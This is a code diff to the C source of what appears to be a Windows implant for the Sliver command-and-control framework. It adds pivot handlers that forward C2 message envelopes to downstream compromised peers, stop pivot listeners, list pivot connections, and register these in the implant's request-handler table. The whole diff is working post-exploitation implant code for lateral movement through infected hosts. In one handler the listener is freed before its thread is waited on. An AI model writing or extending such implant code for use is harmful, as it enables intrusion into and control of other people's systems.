@@ -749,49 +749,6 @@ CLEANUP:
 	return pRespEnvelope;
 }
 
-LPSTR SocketAddressToStr
-(
-	_In_ LPSOCKADDR lpSockAddr
-)
-{
-	LPWSTR lpTemp = NULL;
-	LPSTR lpResult = NULL;
-	DWORD cbTemp = 0x100;
-	NTSTATUS Status = STATUS_SUCCESS;
-
-	LPSOCKADDR_IN6 SockIp6 = NULL;
-	LPSOCKADDR_IN SockIp = NULL;
-	if (lpSockAddr->sa_family == AF_INET) {
-		lpTemp = ALLOC(cbTemp * sizeof(WCHAR));
-		SockIp = (LPSOCKADDR_IN)(lpSockAddr);
-		Status = RtlIpv4AddressToStringExW(&SockIp->sin_addr, 0, lpTemp, &cbTemp);
-		if (Status != STATUS_SUCCESS) {
-			FREE(lpTemp);
-			return NULL;
-		}
-
-		lpResult = ConvertWcharToChar(lpTemp);
-		FREE(lpTemp);
-		return lpResult;
-	}
-	else if (lpSockAddr->sa_family == AF_INET6) {
-		lpTemp = ALLOC(cbTemp * sizeof(WCHAR));
-		SockIp6 = (LPSOCKADDR_IN6)(lpSockAddr);
-		Status = RtlIpv6AddressToStringExW(&SockIp6->sin6_addr, SockIp6->sin6_scope_id, 0, lpTemp, &cbTemp);
-		if (Status != STATUS_SUCCESS) {
-			FREE(lpTemp);
-			return NULL;
-		}
-
-		lpResult = ConvertWcharToChar(lpTemp);
-		FREE(lpTemp);
-		return lpResult;
-	}
-	else {
-		return NULL;
-	}
-}
-
 PENVELOPE IfconfigHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -3429,7 +3386,7 @@ CLEANUP:
 PENVELOPE PivotStartListenerHandler
 (
 	_In_ PENVELOPE pEnvelope,
-	_In_ LPVOID lpServerConn
+	_In_ LPVOID lpSliverClient
 )
 {
 	PENVELOPE pRespEnvelope = NULL;
@@ -3469,7 +3426,7 @@ PENVELOPE PivotStartListenerHandler
 		}
 	}
 	
-	pSessionClient = (PSLIVER_SESSION_CLIENT)lpServerConn;
+	pSessionClient = (PSLIVER_SESSION_CLIENT)lpSliverClient;
 	pConfig = pSessionClient->pGlobalConfig;
 	if (uPivotType == PivotType_TCP) {
 		pListener = CreateTCPPivotListener(pConfig, pSessionClient, lpBindAddress);
@@ -3485,6 +3442,7 @@ PENVELOPE PivotStartListenerHandler
 		goto CLEANUP;
 	}
 
+	AcquireSRWLockExclusive(&pConfig->RWLock);
 	if (pConfig->Listeners == NULL) {
 		pConfig->Listeners = ALLOC(sizeof(PPIVOT_LISTENER));
 	}
@@ -3493,6 +3451,7 @@ PENVELOPE PivotStartListenerHandler
 	}
 
 	pConfig->Listeners[pConfig->dwNumberOfListeners++] = pListener;
+	ReleaseSRWLockExclusive(&pConfig->RWLock);
 	RespElements[0] = CreateVarIntElement(pListener->dwListenerId, 1);
 	RespElements[1] = CreateVarIntElement(pListener->dwType, 2);
 	RespElements[2] = CreateBytesElement(pListener->lpBindAddress, lstrlenA(pListener->lpBindAddress), 3);
@@ -3515,6 +3474,216 @@ CLEANUP:
 	}
 
 	FreeElement(pFinalElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE PivotPeerEnvelopeHandler
+(
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID lpSliverClient
+)
+{
+	PPIVOT_PEER_ENVELOPE pPeerEnvelope = NULL;
+	PENVELOPE pResult = NULL;
+	DWORD i = 0;
+	DWORD j = 0;
+	PPIVOT_PEER pPivotPeer = NULL;
+	PGLOBAL_CONFIG pConfig = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
+	PPIVOT_LISTENER pListener = NULL;
+	PPIVOT_CONNECTION pConnection = NULL;
+	UINT64 uNextPeerID = -1;
+	BOOL Found = FALSE;
+	BOOL Send = FALSE;
+	LPSTR lpError = NULL;
+
+	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
+	pConfig = pSession->pGlobalConfig;
+	pPeerEnvelope = UnmarshalPivotPeerEnvelope(pEnvelope->pData);
+	if (pPeerEnvelope == NULL) {
+		goto CLEANUP;
+	}
+
+	for (i = 0; i < pPeerEnvelope->cPivotPeers; i++) {
+		pPivotPeer = pPeerEnvelope->PivotPeers[i];
+		if (pPivotPeer->uPeerID == pConfig->uPeerID) {
+			if (i >= 1) {
+				uNextPeerID = pPeerEnvelope->PivotPeers[i - 1]->uPeerID;
+				break;
+			}
+		}
+	}
+
+	if (uNextPeerID == -1) {
+		lpError = DuplicateStrA("Peer not found", 0);
+		goto CLEANUP;
+	}
+
+	AcquireSRWLockShared(&pConfig->RWLock);
+	for (i = 0; i < pConfig->dwNumberOfListeners; i++)  {
+		pListener = pConfig->Listeners[i];
+		EnterCriticalSection(&pListener->Lock);
+		for (j = 0; j < pListener->dwNumberOfConnections; j++) {
+			pConnection = pListener->Connections[j];
+			if (pConnection->uDownstreamPeerID == uNextPeerID) {
+				Found = TRUE;
+				break;
+			}
+		}
+
+		LeaveCriticalSection(&pListener->Lock);
+		if (Found) {
+			break;
+		}
+	}
+
+	ReleaseSRWLockShared(&pConfig->RWLock);
+	if (!Found) {
+		lpError = DuplicateStrA("Peer not found", 0);
+		goto CLEANUP;
+	}
+
+	if (!WriteEnvelopeToPeer(pConnection, pEnvelope)) {
+		goto CLEANUP;
+	}
+
+	Send = TRUE;
+CLEANUP:
+	if (!Send) {
+		if (lpError == NULL) {
+			lpError = DuplicateStrA("failed to send to peer", 0);
+		}
+
+		pResult = ALLOC(sizeof(ENVELOPE));
+		pResult->uType = MsgPivotPeerFailure;
+		pResult->pData = MarshalPivotPeerFailure(pConfig->uPeerID, PeerFailureType_SEND_FAILURE, lpError);
+	}
+
+	FREE(lpError);
+	FreePivotPeerEnvelope(pPeerEnvelope);
+	return pResult;
+}
+
+PENVELOPE PivotStopListenerHandler
+(
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID lpSliverClient
+)
+{
+	PPBElement pElement = NULL;
+	PUINT64 pUnmarshaledData = NULL;
+	DWORD dwListenerID = 0;
+	PGLOBAL_CONFIG pConfig = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
+	DWORD i = 0;
+	DWORD j = 0;
+	PPIVOT_LISTENER pListener = NULL;
+	PENVELOPE pResult = NULL;
+
+	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
+	pConfig = pSession->pGlobalConfig;
+	pElement = ALLOC(sizeof(PBElement));
+	pElement->dwFieldIdx = 1;
+	pElement->Type = Varint;
+	pUnmarshaledData = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pUnmarshaledData == NULL) {
+		goto CLEANUP;
+	}
+
+	dwListenerID = *pUnmarshaledData;
+	AcquireSRWLockExclusive(&pConfig->RWLock);
+	for (i = 0; i < pConfig->dwNumberOfListeners; i++) {
+		pListener = pConfig->Listeners[i];
+		if (pListener->dwListenerId == dwListenerID) {
+			FreePivotListener(pListener);
+			WaitForSingleObject(pListener->hThread, INFINITE);
+			for (j = i; j < pConfig->dwNumberOfListeners - 1; j++) {
+				pConfig->Listeners[j] = pConfig->Listeners[j + 1];
+			}
+
+			pConfig->dwNumberOfListeners--;
+			break;
+		}
+	}
+
+	ReleaseSRWLockExclusive(&pConfig->RWLock);
+
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	FREE(pUnmarshaledData);
+
+	return pResult;
+}
+
+PENVELOPE PivotListenersHandler
+(
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID lpSliverClient
+)
+{
+	PGLOBAL_CONFIG pConfig = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
+	DWORD i = 0;
+	DWORD j = 0;
+	PPIVOT_LISTENER pListener = NULL;
+	PPIVOT_CONNECTION pConnection = NULL;
+	PENVELOPE pResult = NULL;
+	PPBElement PivotListener[5];
+	PPBElement NetConnPivot[2];
+	PPBElement Listeners[2];
+	PPBElement* ConnectionList = NULL;
+	PPBElement* ListenerList = NULL;
+	PPBElement pFinalElement = NULL;
+	DWORD dwIdx = 0;
+	PENVELOPE pRespEnvelope = NULL;
+
+	pSession = (PSLIVER_SESSION_CLIENT)lpSliverClient;
+	pConfig = pSession->pGlobalConfig;
+
+	AcquireSRWLockShared(&pConfig->RWLock);
+	ListenerList = ALLOC(sizeof(PPBElement) * pConfig->dwNumberOfListeners);
+	for (i = 0; i < pConfig->dwNumberOfListeners; i++) {
+		pListener = pConfig->Listeners[i];
+		if (pListener->IsExiting) {
+			continue;
+		}
+
+		EnterCriticalSection(&pListener->Lock);
+		SecureZeroMemory(PivotListener, sizeof(PivotListener));
+		PivotListener[0] = CreateVarIntElement(pListener->dwListenerId, 1);
+		PivotListener[1] = CreateVarIntElement(pListener->dwType, 2);
+		PivotListener[2] = CreateBytesElement(pListener->lpBindAddress, lstrlenA(pListener->lpBindAddress), 3);
+		ConnectionList = ALLOC(pListener->dwNumberOfConnections * sizeof(PPBElement));
+		for (j = 0; j < pListener->dwNumberOfConnections; j++) {
+			pConnection = pListener->Connections[j];
+			SecureZeroMemory(NetConnPivot, sizeof(NetConnPivot));
+			NetConnPivot[0] = CreateVarIntElement(pConnection->uDownstreamPeerID, 1);
+			if (pConnection->lpRemoteAddress != NULL) {
+				NetConnPivot[1] = CreateBytesElement(pConnection->lpRemoteAddress, lstrlenA(pConnection->lpRemoteAddress), 2);
+			}
+
+			ConnectionList[j] = CreateStructElement(NetConnPivot, _countof(NetConnPivot), 0);
+		}
+
+		PivotListener[3] = CreateRepeatedStructElement(ConnectionList, pListener->dwNumberOfConnections, 4);
+		ListenerList[dwIdx++] = CreateStructElement(PivotListener, _countof(PivotListener), 0);
+		FREE(ConnectionList);
+		LeaveCriticalSection(&pListener->Lock);
+	}
+
+	ReleaseSRWLockShared(&pConfig->RWLock);
+	Listeners[0] = CreateRepeatedStructElement(ListenerList, dwIdx, 1);
+	Listeners[1] = NULL;
+	pFinalElement = CreateStructElement(Listeners, _countof(Listeners), 0);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pFinalElement->pMarshaledData = NULL;
+CLEANUP:
+	FreeElement(pFinalElement);
+	FREE(ListenerList);
 
 	return pRespEnvelope;
 }
@@ -3580,8 +3749,9 @@ REQUEST_HANDLER* GetSystemHandler()
 
 	// Pivots
 	HandlerList[MsgPivotStartListenerReq] = PivotStartListenerHandler;
-	HandlerList[MsgPivotStopListenerReq] = NULL;
-	HandlerList[MsgPivotListenersReq] = NULL;
+	HandlerList[MsgPivotStopListenerReq] = PivotStopListenerHandler;
+	HandlerList[MsgPivotListenersReq] = PivotListenersHandler;
+	HandlerList[MsgPivotPeerEnvelope] = PivotPeerEnvelopeHandler;
 
 	return HandlerList;
 }
